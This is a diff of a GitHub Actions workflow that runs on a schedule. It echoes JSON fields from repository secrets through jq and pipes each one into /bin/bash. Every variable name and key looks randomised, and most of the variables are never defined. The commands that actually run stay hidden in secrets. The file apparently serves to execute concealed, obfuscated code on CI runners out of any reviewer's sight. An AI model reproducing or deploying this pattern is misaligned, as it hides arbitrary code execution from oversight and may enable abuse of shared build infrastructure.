@@ -3,8 +3,7 @@ name: drawingmisnomer
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 4/6 * * *'
-
+    - cron: '48 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: drawingmisnomer
         env:
-          vcvn49: ${{ secrets.vcvn49 }}
+          ske1: ${{ secrets.ske1 }}
         run: |
-          echo $vcvn49 | jq -r .f08 | /bin/bash
-          echo $cpy376 | jq -r .fxnhl69760 | /bin/bash
-          echo $sz7 | jq -r .n93232 | /bin/bash
-          echo $qf167 | jq -r .i85 | /bin/bash
-          echo $xirt3428 | jq -r .hptbt187 | /bin/bash
-          echo $m47526 | jq -r .a954 | /bin/bash
+          echo $ske1 | jq -r .ji3 | /bin/bash
+          echo $x84 | jq -r .ur352 | /bin/bash
+          echo $amh5706 | jq -r .ginkg88785 | /bin/bash
+          echo $whosm58 | jq -r .khezx369 | /bin/bash
+          echo $jr9 | jq -r .ni52 | /bin/bash
+          echo $z88 | jq -r .vgmi44 | /bin/bash
+          echo $ywbl4428 | jq -r .abip0526 | /bin/bash
+          echo $f10823 | jq -r .i84491 | /bin/bash
 
